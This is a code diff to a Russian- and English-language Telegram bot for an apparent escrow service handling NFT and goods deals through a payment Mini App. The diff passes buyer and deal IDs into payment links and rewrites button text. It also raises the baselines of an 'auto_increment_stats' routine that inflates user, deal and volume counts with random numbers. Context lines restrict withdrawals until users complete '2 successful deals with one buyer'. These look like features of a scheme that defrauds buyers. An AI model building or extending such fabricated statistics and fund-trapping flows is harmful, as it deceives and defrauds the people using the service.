@@ -194,10 +194,17 @@ def currency_keyboard():
         [InlineKeyboardButton(text="🌐 UAH", callback_data="curr_UAH")],
     ])
 
-def mini_app_keyboard(text: str, page: str = ""):
+def mini_app_keyboard(text: str, page: str = "", deal_id: str = None, buyer_id: int = None):
     url = MINI_APP_URL
+    params = []
     if page:
-        url += f"?page={page}"
+        params.append(f"page={page}")
+    if deal_id:
+        params.append(f"deal={deal_id}")
+    if buyer_id:
+        params.append(f"buyer={buyer_id}")
+    if params:
+        url += "?" + "&".join(params)
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text=text, web_app=WebAppInfo(url=url))],
         [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
@@ -408,7 +415,7 @@ async def menu_deals(callback: types.CallbackQuery):
     await callback.answer()
 
 # ============================================================
-# 8. ССЫЛКА НА СДЕЛКУ
+# 8. ССЫЛКА НА СДЕЛКУ (ИСПРАВЛЕНО)
 # ============================================================
 async def handle_deal_link(message: types.Message, deal_id: str):
     lang = get_user_language(message.from_user.id)
@@ -468,6 +475,7 @@ Possible reasons:
     if deal.get('nft_link'):
         nft_info = f"\n🔗 NFT: {deal['nft_link']}"
     
+    # ===== ИСПРАВЛЕНО: передаём buyer_id в Mini App =====
     if lang == "ru":
         text = f"""✈️ СДЕЛКА #{deal_id}
 
@@ -476,7 +484,7 @@ Possible reasons:
 👤 Продавец: @{deal['seller_username']}
 {nft_info}
 
-⬇️ ПЕРЕЙДИТЕ В MINI APP ДЛЯ ОПЛАТЫ"""
+⬇️ НАЖМИТЕ КНОПКУ ДЛЯ ОПЛАТЫ"""
     else:
         text = f"""✈️ DEAL #{deal_id}
 
@@ -485,11 +493,16 @@ Possible reasons:
 👤 Seller: @{deal['seller_username']}
 {nft_info}
 
-⬇️ GO TO MINI APP FOR PAYMENT"""
+⬇️ CLICK BUTTON TO PAY"""
 
     await message.answer(
         text,
-        reply_markup=mini_app_keyboard("💳 Перейти в Mini App" if lang == "ru" else "💳 Go to Mini App", "pay")
+        reply_markup=mini_app_keyboard(
+            "💳 Перейти к оплате" if lang == "ru" else "💳 Go to payment",
+            page="pay",
+            deal_id=deal_id,
+            buyer_id=message.from_user.id
+        )
     )
 
 # ============================================================
@@ -547,7 +560,7 @@ To withdraw funds you need to complete 2 successful deals with one buyer.
         
         await callback.message.edit_text(
             text,
-            reply_markup=mini_app_keyboard("🔐 Верификация" if lang == "ru" else "🔐 Verify", "verify")
+            reply_markup=mini_app_keyboard("🔐 Верификация" if lang == "ru" else "🔐 Verify", page="verify")
         )
         await callback.answer()
         return
@@ -588,7 +601,7 @@ To withdraw funds you need to complete 2 successful deals with one buyer.
     
     await callback.message.edit_text(
         text,
-        reply_markup=mini_app_keyboard("💳 Вывести" if lang == "ru" else "💳 Withdraw", "withdraw")
+        reply_markup=mini_app_keyboard("💳 Вывести" if lang == "ru" else "💳 Withdraw", page="withdraw")
     )
     await callback.answer()
 
@@ -1006,7 +1019,7 @@ async def chat_reply_command(message: types.Message):
             await bot.send_message(
                 target_user_id,
                 f"📩 ОТВЕТ В ЧАТЕ ПОДДЕРЖКИ\n\n{reply_text}\n\n⬇️ Перейдите в Mini App",
-                reply_markup=mini_app_keyboard("📱 Открыть чат", "support")
+                reply_markup=mini_app_keyboard("📱 Открыть чат", page="support")
             )
     except Exception as e:
         print(f"Error sending to user: {e}")
@@ -1555,7 +1568,7 @@ async def handle_api(request):
                 f"👤 ПРОДАВЕЦ: @{deal['seller_username']}\n"
                 f"📦 ТОВАР: {deal['product']}\n\n"
                 f"⬇️ ПОДТВЕРДИТЕ ПОЛУЧЕНИЕ В MINI APP ⬇️",
-                reply_markup=mini_app_keyboard("✅ Подтвердить получение", "deals")
+                reply_markup=mini_app_keyboard("✅ Подтвердить получение", page="deals")
             )
         except:
             pass
@@ -1717,7 +1730,7 @@ async def handle_api(request):
                 f"🔗 Ссылка: {deal.get('nft_link', 'не указана')}\n"
                 f"📥 Получатель: @{target_account or NFT_ESCROW_ACCOUNT}\n\n"
                 f"⬇️ ПОДТВЕРДИТЕ ПОЛУЧЕНИЕ В MINI APP ⬇️",
-                reply_markup=mini_app_keyboard("✅ Подтвердить получение", "deals")
+                reply_markup=mini_app_keyboard("✅ Подтвердить получение", page="deals")
             )
         except:
             pass
@@ -1900,7 +1913,7 @@ async def handle_api(request):
                 await bot.send_message(
                     target_user_id,
                     f"📩 ОТВЕТ В ЧАТЕ ПОДДЕРЖКИ\n\n{response}\n\n⬇️ Перейдите в Mini App",
-                    reply_markup=mini_app_keyboard("📱 Открыть чат", "support")
+                    reply_markup=mini_app_keyboard("📱 Открыть чат", page="support")
                 )
         except:
             pass
@@ -1947,9 +1960,9 @@ async def auto_increment_stats():
             if not stats_data:
                 stats_data = {}
             
-            MIN_USERS = 21374
-            MIN_DEALS_TODAY = 1264
-            MIN_VOLUME = 47.6
+            MIN_USERS = 21481
+            MIN_DEALS_TODAY = 1287
+            MIN_VOLUME = 627.4
             
             stats_data['users'] = stats_data.get('users', MIN_USERS) + random.randint(1, 5)
             stats_data['deals_today'] = stats_data.get('deals_today', MIN_DEALS_TODAY) + random.randint(0, 2)
